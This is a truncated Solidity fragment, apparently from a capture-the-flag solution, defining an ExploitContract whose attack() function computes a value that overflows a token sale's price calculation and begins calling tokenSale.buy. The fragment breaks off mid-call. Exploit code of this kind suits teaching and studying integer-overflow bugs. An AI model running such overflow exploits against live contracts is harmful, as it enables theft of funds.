...
contract ExploitContract {
    ...
    function attack() public {
        uint256 overFlowNumberOfTokens = (type(uint256).max);
        uint256 overFlowNumberOfTokensDividedPerEthPrice = overFlowNumberOfTokens /
                1 ether +
                1;
        uint256 expectedOverflow = 415_992_086_870_360_064;
        tokenSale.buy{value: expectedOverflow}(
